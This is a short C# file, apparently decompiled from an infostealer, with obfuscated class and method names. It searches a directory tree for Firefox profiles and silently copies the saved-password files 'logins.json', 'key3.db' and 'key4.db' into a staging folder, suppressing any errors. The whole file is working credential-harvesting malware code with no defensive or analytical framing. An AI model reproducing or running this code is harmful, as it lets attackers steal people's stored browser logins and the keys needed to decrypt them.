using System.IO;

namespace ns10;

internal sealed class Class38
{
	private static string[] string_0 = new string[3] { "key3.db", "key4.db", "logins.json" };

	private static void smethod_0(string string_1, string string_2)
	{
		try
		{
			if (File.Exists(string_1))
			{
				File.Copy(string_1, string_2 + "\\" + Path.GetFileName(string_1));
			}
		}
		catch
		{
		}
	}

	public static void smethod_1(string string_1, string string_2)
	{
		if (!Directory.Exists(string_1))
		{
			return;
		}
		string[] files = Directory.GetFiles(string_1, "logins.json", SearchOption.AllDirectories);
		if (files == null)
		{
			return;
		}
		string[] array = files;
		foreach (string path in array)
		{
			string[] array2 = string_0;
			foreach (string path2 in array2)
			{
				smethod_0(Path.Combine(Path.GetDirectoryName(path), path2), string_2);
			}
		}
	}
}
